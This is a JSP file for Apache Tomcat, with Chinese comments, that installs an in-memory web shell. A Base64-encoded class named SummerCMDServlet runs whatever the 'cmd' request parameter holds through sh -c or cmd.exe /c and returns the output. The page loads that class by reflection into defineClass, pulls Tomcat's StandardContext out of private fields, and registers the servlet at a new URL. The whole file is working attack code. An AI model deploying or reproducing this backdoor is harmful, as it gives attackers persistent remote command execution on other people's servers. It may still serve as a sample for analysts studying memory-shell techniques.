<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %> 
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    String SUMMER_CMD_SERVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAANjbWQLAB8AJAwAJQAmAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACgBAAdvcy5uYW1lCgAqACsHACwMAC0AJgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQoALwAwBwAxDAAyADMBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgANQEAA3dpbgoALwA3DAA4ADkBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggAOwEAAnNoCAA9AQACLWMIAD8BAAdjbWQuZXhlCABBAQACL2MKAEMARAcARQwARgBHAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBDAEkMAEoASwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBNAE4HAE8MAFAAUQEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAUwEAEWphdmEvdXRpbC9TY2FubmVyCgBSAFUMAAUAVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVggAWAEAAlxhCgBSAFoMAFsAXAEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwoAUgBeDABfAGABAAdoYXNOZXh0AQADKClaCgBSAGIMAGMAMwEABG5leHQIAGUBAAAKABsAZwwAaAAGAQAFZmx1c2gKABsAagwAawAGAQAFY2xvc2UHAG0BABNqYXZhL2xhbmcvVGhyb3dhYmxlCgBsAG8MAHAAcQEADWFkZFN1cHByZXNzZWQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYHAHMBAB5jb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQHAHUBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAgQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5yZXNwb25zZVdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwCbAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAcAjQcAngEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAOZ2V0U2VydmxldEluZm8BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAFVN1bW1lckNNRFNlcnZsZXQuamF2YQAhAHIAAgABAHQAAAAGAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAgB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAH8AAAAEAAEAgAABAIIAgwABAHYAAAAsAAEAAQAAAAIBsAAAAAIAdwAAAAYAAQAAABkAeAAAAAwAAQAAAAIAeQB6AAAAAQCEAIUAAgB2AAACjQAEAA4AAADsLBIHuQAJAgAsEg+5ABECACy5ABQBABIYtgAaK8AAH04tEiG5ACMCADoEGQTGAL8ENgUSJ7gAKToGGQbGABMZBrYALhI0tgA2mQAGAzYFFQWZABkGvQAvWQMSOlNZBBI8U1kFGQRTpwAWBr0AL1kDEj5TWQQSQFNZBRkEUzoHuABCGQe2AEi2AEw6CLsAUlkZCLcAVBJXtgBZOgkZCbYAXZkACxkJtgBhpwAFEmQ6Ciy5ABQBADoLGQsZCrYAGhkLtgBmGQvGACYZC7YAaacAHjoMGQvGABQZC7YAaacADDoNGQwZDbYAbhkMv7EAAgC3AMMA0ABsANcA3ADfAGwAAwB3AAAAVgAVAAAAHwAIACAAEAAhABsAIgAgACMAKgAkAC8AJQAyACYAOQAnAEsAKABOACoAaQArAH4ALACLAC0AmwAuAK8ALwC3ADAAvgAxAMMAMgDQAC8A6wA0AHgAAAB6AAwAtwA0AIYAhwALADIAuQCIAIkABQA5ALIAigCLAAYAfgBtAIwAjQAHAIsAYACOAI8ACACbAFAAkACRAAkArwA8AJIAiwAKAAAA7AB5AHoAAAAAAOwAkwCUAAEAAADsAJUAlgACACAAzACXAJgAAwAqAMIAIgCLAAQAmQAAAKMACf8ATgAHBwByBwCaBwAKBwAfBwAvAQcALwAAGlIHAJz+AC4HAJwHAJ0HAFJBBwAv/wAiAAwHAHIHAJoHAAoHAB8HAC8BBwAvBwCcBwCdBwBSBwAvBwAbAAEHAGz/AA4ADQcAcgcAmgcACgcAHwcALwEHAC8HAJwHAJ0HAFIHAC8HABsHAGwAAQcAbAj/AAIABQcAcgcAmgcACgcAHwcALwAAAH8AAAAGAAIAgACfAAEAoQAzAAEAdgAAACwAAQABAAAAAgGwAAAAAgB3AAAABgABAAAAOAB4AAAADAABAAAAAgB5AHoAAAABAKIABgABAHYAAAArAAAAAQAAAAGxAAAAAgB3AAAABgABAAAAPQB4AAAADAABAAAAAQB5AHoAAAABAKMAAAACAKQ=";
    // 获取当前线程的上下文类加载器 ClassLoader
    ClassLoader loader = Thread.currentThread().getContextClassLoader();
    // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
    Base64.Decoder base64Decoder = Base64.getDecoder();
    byte[] decodeBytes = base64Decoder.decode(SUMMER_CMD_SERVLET_CLASS_STRING_BASE64);

    // 通过反射调用ClassLoader的defineClass方法，将字节数组转换为Class对象
    Method method = null;
    Class<?> clz = loader.getClass();
    Class<?> servletClass = null;
%>

<%
    // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
    // Object 类为止
    while (method == null && clz != Object.class) {
        try {
            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        } catch (NoSuchMethodException ex) {
            clz = clz.getSuperclass();
        }
    }
    if (method != null) {
        // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
        method.setAccessible(true);
        // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
        servletClass = (Class<?>) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
    }
    // 获取StandardContext
    StandardContext standardCtx = null;
    ServletContext servletContext = request.getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    Object appContext = appContextField.get(servletContext);

    Field standardCtxField = appContext.getClass().getDeclaredField("context");
    standardCtxField.setAccessible(true);
    standardCtx = (StandardContext) standardCtxField.get(appContext);

    if (standardCtx != null) {
        // 用Wrapper对其进行封装
        org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
        newWrapper.setName("dynamicAddServletPlainClass");
        newWrapper.setLoadOnStartup(1);
        newWrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
        newWrapper.setServletClass(servletClass.getName());

        // 添加封装后的恶意Wrapper到StandardContext的children当中
        standardCtx.addChild(newWrapper);

        // 添加ServletMapping将访问的URL和Servlet进行绑定
        standardCtx.addServletMappingDecoded("/dynamicAddServletPlainClass", "dynamicAddServletPlainClass");
        out.println("Successfully added a new servlet By Base64 Class String to StandardContext");
    } else {
        out.println("Failed to get StandardContext");
    }
%>